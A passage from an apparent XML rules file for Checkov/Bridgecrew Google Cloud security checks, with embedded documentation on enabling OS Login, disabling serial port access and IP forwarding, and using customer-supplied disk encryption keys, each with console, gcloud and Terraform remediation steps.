<li><strong>Field</strong>: metadata</li>
<li><strong>Argument</strong>: block-project-ssh-keys</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_compute_instance" "default" {
  name         = "test"
  machine_type = "n1-standard-1"
  zone         = "us-central1-a"
  metadata = {
+     block-project-ssh-keys = true
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_8' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_networking_8</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_8' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_33</key>
    <name>Ensure GCP projects have OS login enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-projects-have-os-login-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-projects-have-os-login-disabled"></div>GCP projects have OS login disabled</div><a aria-label="Skip link to GCP projects have OS login disabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-projects-have-os-login-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling OSLogin ensures that SSH keys used to connect to instances are mapped with IAM users. Revoking access to IAM user will revoke all the SSH keys associated with that particular user. It facilitates centralized and automated SSH key pair management. This is useful in handling cases such as response to compromised SSH key pairs and/or revocation of external/third-party/Vendor users.</p>
<p>We recommend you enable OSLogin to bind SSH certificates to IAM users and facilitates effective SSH certificate management.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/compute/metadata" target="_self">Metadata</a>.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Add a metadata entry where the key is <strong>enable-oslogin</strong> and the value is <strong>TRUE</strong>.</li>
<li>To apply changes, click <strong>Save</strong>.</li>
<li>For every instances that overrides the project setting, go to the <strong>VM Instances</strong> page<br/>
at <a href="https://console.cloud.google.com/compute/instances" target="_self">https://console.cloud.google.com/compute/instances</a>.</li>
<li>Click the name of the instance on which you want to remove the metadata value.</li>
<li>To edit the instance settings go to the top of the instance details page and click <strong>Edit</strong>.</li>
<li>Under <strong>Custom metadata</strong>, remove any entry with key <strong>enable-oslogin</strong> and the value<br/>
is <strong>FALSE</strong>.</li>
<li>To apply your changes to the instance, navigate to the bottom of the instance details page and click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>Configure oslogin on the project using the following command:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute project-info add-metadata --metadata enable-oslogin=TRUE
</code></pre>
<ol start="2">
<li>Remove instance metadata that overrides the project setting, using the following command:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances remove-metadata INSTANCE_NAME --keys=enable-oslogin
</code></pre>
<p>Optionally, you can enable two factor authentication for OS login. For more information, see <a href="https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication" target="_self">https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication</a>.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>
<p><strong>Resource</strong>: google_compute_project_metadata</p>
</li>
<li>
<p><strong>Argument</strong>: enable-oslogin</p>
</li>
<li>
<p><strong>Resource</strong>: google_compute_instance</p>
</li>
<li>
<p><strong>Argument</strong>: enable-oslogin<br/>
Should not override project metadata: should not be set to false.</p>
</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">//Option 1
resource "google_compute_project_metadata" "default" {
  metadata = {
+    enable-oslogin = true
  }
}

//Option 2
resource "google_compute_instance" "default" {
  name         = "test"
  machine_type = "n1-standard-1"
  zone         = "us-central1-a"
  boot_disk {}
  metadata = {
-     enable-oslogin = false
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_9' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_networking_9</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_9' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_34</key>
    <name>Ensure project instance does not override the project setting enabling OSLogin</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="project-instance-overrides-the-project-setting-enabling-oslogin"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-project-instance-overrides-the-project-setting-enabling-os-login"></div>Project instance overrides the project setting enabling OSLogin</div><a aria-label="Skip link to Project instance overrides the project setting enabling OSLogin" class="heading-anchor-icon fa fa-anchor" href="#project-instance-overrides-the-project-setting-enabling-oslogin"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling OSLogin ensures that SSH keys used to connect to instances are mapped with IAM users. Revoking access to IAM user will revoke all the SSH keys associated with that particular user. It facilitates centralized and automated SSH key pair management. This is useful in handling cases such as response to compromised SSH key pairs and/or revocation of external/third-party/Vendor users.</p>
<p>We recommend you enable OSLogin to bind SSH certificates to IAM users and facilitates effective SSH certificate management.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/compute/metadata" target="_self">Metadata</a>.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Add a metadata entry where the key is <strong>enable-oslogin</strong> and the value is <strong>TRUE</strong>.</li>
<li>To apply changes, click <strong>Save</strong>.</li>
<li>For every instances that overrides the project setting, go to the <strong>VM Instances</strong> page<br/>
at <a href="https://console.cloud.google.com/compute/instances" target="_self">https://console.cloud.google.com/compute/instances</a>.</li>
<li>Click the name of the instance on which you want to remove the metadata value.</li>
<li>To edit the instance settings go to the top of the instance details page and click <strong>Edit</strong>.</li>
<li>Under <strong>Custom metadata</strong>, remove any entry with key <strong>enable-oslogin</strong> and the value<br/>
is <strong>FALSE</strong>.</li>
<li>To apply your changes to the instance, navigate to the bottom of the instance details page and click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>To configure oslogin on the project, use the following command:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute project-info add-metadata --metadata enable-oslogin=TRUE
</code></pre>
<ol start="2">
<li>To remove instance metadata that overrides the project setting, use the following command:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances remove-metadata INSTANCE_NAME --keys=enable-oslogin
</code></pre>
<p>Optionally, you can enable two factor authentication for OS login. For more information, see <a href="https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication" target="_self">https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication</a>.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>
<p><strong>Resource</strong>: google_compute_project_metadata</p>
</li>
<li>
<p><strong>Argument</strong>: enable-oslogin</p>
</li>
<li>
<p><strong>Resource</strong>: google_compute_instance</p>
</li>
<li>
<p><strong>Argument</strong>: enable-oslogin<br/>
Should not override project metadata: should not be set to false.</p>
</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">//Option 1
resource "google_compute_project_metadata" "default" {
  metadata = {
+    enable-oslogin = true
  }
}

//Option 2
resource "google_compute_instance" "default" {
  name         = "test"
  machine_type = "n1-standard-1"
  zone         = "us-central1-a"
  boot_disk {}
  metadata = {
-     enable-oslogin = false
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_10' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_networking_10</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_10' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_35</key>
    <name>Ensure GCP VM instances do not have serial port access enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-vm-instances-have-serial-port-access-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-vm-instances-have-serial-port-access-enabled"></div>GCP VM instances have serial port access enabled</div><a aria-label="Skip link to GCP VM instances have serial port access enabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-vm-instances-have-serial-port-access-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Interacting with a serial port is often referred to as the serial console. It is similar to using a terminal window: input and output is entirely in text mode with no graphical interface or mouse support. If the interactive serial console on an instance is enabled, clients can attempt to connect to that instance from any IP address. For security purposes interactive serial console support should be disabled.</p>
<p>A virtual machine instance has four virtual serial ports. Interacting with a serial port is similar to using a terminal window: input and output is entirely in text mode with no graphical interface or mouse support. The instance's BIOS operating system and other system-level entities write output to the serial ports and accept input, for example, commands and responses to prompts. Typically, these system-level entities use the first serial port (port 1). Serial port 1 is often referred to as the serial console.</p>
<p>The interactive serial console does not support IP-based access restrictions, for example, an IP whitelist. If you enable the interactive serial console on an instance, clients can connect to that instance from any IP address. This allows anybody with the correct SSH key, username, project ID, zone, and instance name to connect to that instance. To stop this type of access interactive serial console support should be disabled.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <strong>Computer Engine</strong>.</li>
<li>Navigate to <strong>VM instances</strong>.</li>
<li>Select the specific VM.  </li>
<li>Click <strong>Edit</strong>.</li>
<li>Clear the checkbox <strong>Enable connecting to serial ports</strong>, located below the <strong>Remote access</strong> block.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To disable an instance use one of the following commands: </p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances add-metadata INSTANCE_NAME 
--zone=ZONE 
--metadata=serial-port-enable=false
</code></pre>
<p>OR</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances add-metadata INSTANCE_NAME 
--zone=ZONE 
--metadata=serial-port-enable=0
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_compute_instance</li>
<li><strong>Argument</strong>: serial-port-enable<br/>
By default set to false.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_compute_instance" "default" {
  name         = "test"
  machine_type = "n1-standard-1"
  zone         = "us-central1-a"
  boot_disk {}
  metadata = {
-     serial-port-enable = true
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_11' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_networking_11</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_11' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_36</key>
    <name>Ensure IP forwarding on instances is disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ip-forwarding-on-instances-is-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ip-forwarding-on-instances-is-enabled"></div>IP forwarding on instances is enabled</div><a aria-label="Skip link to IP forwarding on instances is enabled" class="heading-anchor-icon fa fa-anchor" href="#ip-forwarding-on-instances-is-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Compute Engine instance cannot forward a packet unless the source IP address of the packet matches the IP address of the instance. GCP will not deliver a packet with a destination IP address different to the IP address of the instance receiving the packet. Both capabilities are required when using instances to help route packets. </p>
<p>To enable this source and destination IP check, disable the <strong>canIpForward</strong> field. The <strong>canIpForward</strong> field allows an instance to send and receive packets with non-matching destination or source IPs.</p>
<p>We recommend the forwarding of data packets be disabled to prevent data loss and information disclosure.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>The canIpForward setting  can only be edited at instance creation time. It is recommended to<br/>
<strong>delete</strong> the instance and <strong>create</strong> a new one with canIpForward set to <strong>False</strong>.</p>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/compute/instances" target="_self">VM instances</a>.</li>
<li>Select the <strong>VM Instance</strong> to remediate.</li>
<li>Click <strong>Delete</strong>.</li>
<li>On the <strong>VM Instances</strong> page, click <strong>CREATE INSTANCE</strong>.</li>
<li>Create a new instance with the desired configuration. </li>
</ol>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>By default, a new instance is configured to not allow IP forwarding.</p></blockquote>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>
<p>To <strong>delete</strong> an instance, use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances delete INSTANCE_NAME</code></p>
</li>
<li>
<p>To <strong>create</strong> a new instance to replace it with <strong>IP forwarding set to Off</strong>, use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances create</code></p>
</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_compute_instance</li>
<li><strong>Argument</strong>: can_ip_forward<br/>
By default set to false.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_compute_instance" "default" {
  name         = "test"
  machine_type = "n1-standard-1"
  zone         = "us-central1-a"
- can_ip_forward = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_12' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_networking_12</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_12' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_37</key>
    <name>Ensure GCP VM disks are encrypted with CSEKs</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-vm-disks-not-encrypted-with-cseks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-vm-disks-not-encrypted-with-cse-ks"></div>GCP VM disks not encrypted with CSEKs</div><a aria-label="Skip link to GCP VM disks not encrypted with CSEKs" class="heading-anchor-icon fa fa-anchor" href="#gcp-vm-disks-not-encrypted-with-cseks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Customer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.</p>
<p>We recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical VM disks. This helps protect the Google-generated keys used to encrypt and decrypt your data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>Currently there is no way to update the encryption of an existing disk.<br/>
Ensure you create new disks with Encryption set to Customer supplied.</p>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/compute/disks" target="_self">Compute Engine Disks</a>.</li>
<li>Click <strong>CREATE DISK</strong>.</li>
<li>Set <strong>Encryption type</strong> to <strong>Customer supplied</strong>.</li>
<li>In the dialog box, enter the <strong>Key</strong>.</li>
<li>Select <strong>Wrapped key</strong>.</li>
<li>Click <strong>Create</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>In the gcloud compute tool, encrypt a disk, use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">--csek-key-file flag during instance creation</code></p>
<p>If you are using an RSA-wrapped key, use the gcloud beta component and the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud (beta) compute instances create INSTANCE_NAME 
--csek-key-file &lt;example-file.json&gt;
</code></pre>
<p>To encrypt a standalone persistent disk, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud (beta) compute disks create DISK_NAME 
--csek-key-file &lt;examplefile.json&gt;
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_compute_disk</li>
<li><strong>Field</strong>: disk_encryption_key</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">// Option 1
resource "google_compute_disk" "default" {

  ...
  
+  disk_encryption_key {
+    raw_key = &lt;raw key&gt;
  or
+    kms_key_self_link = &lt;key link&gt;
    }
 +  boot_disk {
 +    disk_encryption_key_raw = &lt;encryption key&gt;
    }

}
// Option 2
resource "google_compute_instance" "default" {
  
  ...
  
+  boot_disk {
+    disk_encryption_key_raw = &lt;encryption key&gt;
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_general_x' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_general_x</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_general_x' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_38</key>
    <name>Ensure boot disks for instances use CSEKs</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="boot-disks-for-instances-do-not-use-cseks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-boot-disks-for-instances-do-not-use-cse-ks"></div>Boot disks for instances do not use CSEKs</div><a aria-label="Skip link to Boot disks for instances do not use CSEKs" class="heading-anchor-icon fa fa-anchor" href="#boot-disks-for-instances-do-not-use-cseks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Customer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.</p>
